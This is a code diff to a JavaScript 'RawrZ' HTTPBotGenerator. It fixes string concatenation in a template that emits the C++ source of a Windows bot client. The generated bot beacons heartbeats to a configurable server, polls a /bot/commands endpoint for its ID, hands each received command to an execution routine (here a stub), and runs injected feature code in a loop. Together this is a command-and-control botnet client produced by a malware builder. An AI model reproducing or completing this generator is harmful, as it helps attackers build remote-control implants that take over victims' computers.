@@ -105,107 +105,107 @@ class HTTPBotGenerator {
         return '// RawrZ HTTP Bot - C++ Implementation\n' +
             '// Generated: ' + timestamp + '\n' +
             '// Bot ID: ' + botId + '\n' +
-
-#include <iostream>
-#include <windows.h>
-#include <wininet.h>
-#include <string>
-#include <vector>
-#include <thread>
-#include <chrono>
-#include <fstream>
-#include <sstream>
-
-#pragma comment(lib, "wininet.lib")
-
-class RawrZHTTPBot {
-private:
-    std::string serverUrl = "${config.server || 'http://localhost:8080'}";
-    std::string botId = "${botId}";
-    std::string botName = "${config.name || 'HTTPBot'}";
-    bool isRunning = false;
-    
-public:
-    void run() {
-        std::cout << "RawrZ HTTP Bot ${botId} starting..." << std::endl;
-        isRunning = true;
-        
-        // Initialize features
-        ${featureCode.init}
-        
-        // Main bot loop
-        while (isRunning) {
-            try {
-                // Send heartbeat
-                sendHeartbeat();
-                
-                // Check for commands
-                std::string command = receiveCommand();
-                if (!command.empty()) {
-                    executeCommand(command);
-                }
-                
-                // Execute features
-                ${featureCode.execute}
-                
-                std::this_thread::sleep_for(std::chrono::seconds(5));
-            } catch (const std::exception& e) {
-                std::cerr << "Error: " << e.what() << std::endl;
-                std::this_thread::sleep_for(std::chrono::seconds(10));
-            }
-        }
-    }
-    
-    void sendHeartbeat() {
-        std::string data = "bot_id=" + botId + "&status=alive&timestamp=" + std::to_string(time(nullptr));
-        sendHTTPRequest("/bot/heartbeat", data);
-    }
-    
-    std::string receiveCommand() {
-        std::string response = sendHTTPRequest("/bot/commands/" + botId, "");
-        return response;
-    }
-    
-    void executeCommand(const std::string& command) {
-        std::cout << "Executing command: " << command << std::endl;
-        // Command execution logic here
-    }
-    
-    std::string sendHTTPRequest(const std::string& endpoint, const std::string& data) {
-        HINTERNET hInternet = InternetOpenA("RawrZ HTTP Bot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-        if (!hInternet) return "";
-        
-        HINTERNET hConnect = InternetOpenUrlA(hInternet, (serverUrl + endpoint).c_str(), 
-                                            data.empty() ? NULL : data.c_str(), 
-                                            data.length(), 
-                                            INTERNET_FLAG_RELOAD, 0);
-        if (!hConnect) {
-            InternetCloseHandle(hInternet);
-            return "";
-        }
-        
-        std::string response;
-        char buffer[4096];
-        DWORD bytesRead;
-        
-        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
-            response.append(buffer, bytesRead);
-        }
-        
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
-        
-        return response;
-    }
-    
-    " + featureCode.methods + "
-};
-
-int main() {
-    RawrZHTTPBot bot;
-    bot.run();
-    return 0;
-}`;
+            '\n' +
+            '#include <iostream>\n' +
+            '#include <windows.h>\n' +
+            '#include <wininet.h>\n' +
+            '#include <string>\n' +
+            '#include <vector>\n' +
+            '#include <thread>\n' +
+            '#include <chrono>\n' +
+            '#include <fstream>\n' +
+            '#include <sstream>\n' +
+            '\n' +
+            '#pragma comment(lib, "wininet.lib")\n' +
+            '\n' +
+            'class RawrZHTTPBot {\n' +
+            'private:\n' +
+            '    std::string serverUrl = "' + (config.server || 'http://localhost:8080') + '";\n' +
+            '    std::string botId = "' + botId + '";\n' +
+            '    std::string botName = "' + (config.name || 'HTTPBot') + '";\n' +
+            '    bool isRunning = false;\n' +
+            '    \n' +
+            'public:\n' +
+            '    void run() {\n' +
+            '        std::cout << "RawrZ HTTP Bot ' + botId + ' starting..." << std::endl;\n' +
+            '        isRunning = true;\n' +
+            '        \n' +
+            '        // Initialize features\n' +
+            '        ' + featureCode.init + '\n' +
+            '        \n' +
+            '        // Main bot loop\n' +
+            '        while (isRunning) {\n' +
+            '            try {\n' +
+            '                // Send heartbeat\n' +
+            '                sendHeartbeat();\n' +
+            '                \n' +
+            '                // Check for commands\n' +
+            '                std::string command = receiveCommand();\n' +
+            '                if (!command.empty()) {\n' +
+            '                    executeCommand(command);\n' +
+            '                }\n' +
+            '                \n' +
+            '                // Execute features\n' +
+            '                ' + featureCode.execute + '\n' +
+            '                \n' +
+            '                std::this_thread::sleep_for(std::chrono::seconds(5));\n' +
+            '            } catch (const std::exception& e) {\n' +
+            '                std::cerr << "Error: " << e.what() << std::endl;\n' +
+            '                std::this_thread::sleep_for(std::chrono::seconds(10));\n' +
+            '            }\n' +
+            '        }\n' +
+            '    }\n' +
+            '    \n' +
+            '    void sendHeartbeat() {\n' +
+            '        std::string data = "bot_id=" + botId + "&status=alive&timestamp=" + std::to_string(time(nullptr));\n' +
+            '        sendHTTPRequest("/bot/heartbeat", data);\n' +
+            '    }\n' +
+            '    \n' +
+            '    std::string receiveCommand() {\n' +
+            '        std::string response = sendHTTPRequest("/bot/commands/" + botId, "");\n' +
+            '        return response;\n' +
+            '    }\n' +
+            '    \n' +
+            '    void executeCommand(const std::string& command) {\n' +
+            '        std::cout << "Executing command: " << command << std::endl;\n' +
+            '        // Command execution logic here\n' +
+            '    }\n' +
+            '    \n' +
+            '    std::string sendHTTPRequest(const std::string& endpoint, const std::string& data) {\n' +
+            '        HINTERNET hInternet = InternetOpenA("RawrZ HTTP Bot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n' +
+            '        if (!hInternet) return "";\n' +
+            '        \n' +
+            '        HINTERNET hConnect = InternetOpenUrlA(hInternet, (serverUrl + endpoint).c_str(), \n' +
+            '                                            data.empty() ? NULL : data.c_str(), \n' +
+            '                                            data.length(), \n' +
+            '                                            INTERNET_FLAG_RELOAD, 0);\n' +
+            '        if (!hConnect) {\n' +
+            '            InternetCloseHandle(hInternet);\n' +
+            '            return "";\n' +
+            '        }\n' +
+            '        \n' +
+            '        std::string response;\n' +
+            '        char buffer[4096];\n' +
+            '        DWORD bytesRead;\n' +
+            '        \n' +
+            '        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {\n' +
+            '            response.append(buffer, bytesRead);\n' +
+            '        }\n' +
+            '        \n' +
+            '        InternetCloseHandle(hConnect);\n' +
+            '        InternetCloseHandle(hInternet);\n' +
+            '        \n' +
+            '        return response;\n' +
+            '    }\n' +
+            '    \n' +
+            '    ' + featureCode.methods + '\n' +
+            '};\n' +
+            '\n' +
+            'int main() {\n' +
+            '    RawrZHTTPBot bot;\n' +
+            '    bot.run();\n' +
+            '    return 0;\n' +
+            '}';
     }
 
     generateCPPFeatures(features) {
